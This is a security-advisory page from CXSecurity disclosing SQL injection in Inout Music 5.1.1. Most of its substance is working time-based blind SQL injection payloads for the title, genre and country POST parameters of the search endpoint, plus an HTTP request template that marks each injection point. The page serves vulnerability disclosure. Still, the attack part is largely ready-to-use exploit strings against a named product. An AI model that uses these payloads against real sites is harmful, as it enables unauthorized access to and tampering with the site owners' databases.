---
title: Inout Music 5.1.1 SQL Injection
url: https://cxsecurity.com/issue/WLB-2023010046
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-27
fetch_date: 2025-10-04T04:57:40.143099
---

# Inout Music 5.1.1 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Inout Music 5.1.1 SQL Injection** **2023.01.26**  Credit:  **[CraCkEr](https://cxsecurity.com/author/CraCkEr/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

┌┌───────────────────────────────────────────────────────────────────────────────────────┐
││ C r a C k E r ┌┘
┌┘ T H E C R A C K O F E T E R N A L M I G H T ││
└───────────────────────────────────────────────────────────────────────────────────────┘┘
┌──── From The Ashes and Dust Rises An Unimaginable crack.... ────┐
┌┌───────────────────────────────────────────────────────────────────────────────────────┐
┌┘ [ Vulnerability ] ┌┘
└───────────────────────────────────────────────────────────────────────────────────────┘┘
: Author : CraCkEr :
│ Website : inoutscripts.com │
│ Vendor : Inout Scripts - Nesote Technologies Private Limited │
│ Software : Inout Music 5.1.1 │
│ Vuln Type: SQL Injection │
│ Impact : Database Access │
│ │
│────────────────────────────────────────────────────────────────────────────────────────│
│ ┌┘
└───────────────────────────────────────────────────────────────────────────────────────┘┘
: :
│ Release Notes: │
│ ═════════════ │
│ │
│ SQL injection attacks can allow unauthorized access to sensitive data, modification of │
│ data and crash the application or make it unavailable, leading to lost revenue and │
│ damage to a company reputation │
│ │
┌┌───────────────────────────────────────────────────────────────────────────────────────┐
┌┘ ┌┘
└───────────────────────────────────────────────────────────────────────────────────────┘┘
Greets:
The\_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL
CryptoJob (Twitter) twitter.com/CryptozJob
┌┌───────────────────────────────────────────────────────────────────────────────────────┐
┌┘ © CraCkEr 2023 ┌┘
└───────────────────────────────────────────────────────────────────────────────────────┘┘
Path: /index.php?page=explore/search
Method: POST
POST parameter 'title' is vulnerable to SQLI
---
Parameter: title (POST)
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: title=1' AND (SELECT 9844 FROM (SELECT(SLEEP(5)))scaa) AND 'tLOV'='tLOV
---
POST parameter 'genre' is vulnerable to SQLI
---
Parameter: genre (POST)
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: title=1&type=videoalbum&genre=1') AND (SELECT 3533 FROM (SELECT(SLEEP(5)))ENgP) AND ('MnKg'='MnKg&country=10
---
POST parameter 'country' is vulnerable to SQLI
---
Parameter: country (POST)
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: title=1&type=videoalbum&genre=1&country=10 AND (SELECT 4811 FROM (SELECT(SLEEP(5)))nDdo)
---
+-----------------------------------------------------------+
POST /index.php?page=explore/search HTTP/2
-----------------------------116235583720082436942508111905
Content-Disposition: form-data; name="title"
love[Inject-HERE]
-----------------------------116235583720082436942508111905
Content-Disposition: form-data; name="type"
audioalbum
-----------------------------116235583720082436942508111905
Content-Disposition: form-data; name="genre"
1[Inject-HERE]
-----------------------------116235583720082436942508111905
Content-Disposition: form-data; name="country"
3[Inject-HERE]
-----------------------------116235583720082436942508111905--
+-----------------------------------------------------------+
[-] Done

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023010046)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top